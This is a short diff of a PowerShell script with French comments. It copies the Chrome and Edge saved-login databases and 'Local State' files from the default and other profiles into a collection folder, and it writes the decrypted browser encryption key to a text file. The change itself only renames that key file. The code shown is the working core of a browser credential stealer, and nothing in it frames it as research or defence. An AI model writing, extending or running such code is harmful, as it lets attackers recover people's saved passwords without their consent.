@@ -52,7 +52,7 @@ catch {
 # Récupère les informations de connexion pour le profil par défaut
 Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\google\LoginData_0"
 Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\google\LocalState"
-New-Item -Path "$DestinationPath\google\decrypted_key_google.txt" -ItemType File -Value $decryptedKeyBase64
+New-Item -Path "$DestinationPath\google\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
 
 # Récupère les informations de connexion pour chaque profil "Profile*"
 $profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
@@ -88,7 +88,7 @@ catch {
 # Récupère les informations de connexion pour le profil par défaut
 Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Destination "$DestinationPath\edge\LoginData_0"
 Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination "$DestinationPath\edge\LocalState"
-New-Item -Path "$DestinationPath\edge\decrypted_key_edge.txt" -ItemType File -Value $decryptedKeyBase64
+New-Item -Path "$DestinationPath\edge\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64
 
 # Récupère les informations de connexion pour chaque profil "Profile*"
 $profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
